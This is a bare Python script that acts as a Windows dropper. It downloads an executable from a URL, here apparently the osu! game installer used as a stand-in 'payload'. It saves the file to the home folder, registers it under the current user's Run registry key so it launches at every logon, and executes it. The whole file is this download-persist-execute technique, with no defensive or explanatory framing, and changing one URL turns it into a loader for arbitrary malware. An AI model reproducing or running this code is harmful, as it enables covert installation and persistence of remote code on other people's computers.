import urllib.request, os, winreg
from pathlib import Path

home = Path.home()

payload_url = 'https://github.com/ppy/osu/releases/latest/download/install.exe'
payload_save_location = str(home) + r'\payload.exe'

urllib.request.urlretrieve(payload_url, 'payload.exe')
os.replace('payload.exe', payload_save_location)

k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, 'program', 0, winreg.REG_SZ, payload_save_location)
winreg.CloseKey(k)

os.system(payload_save_location)
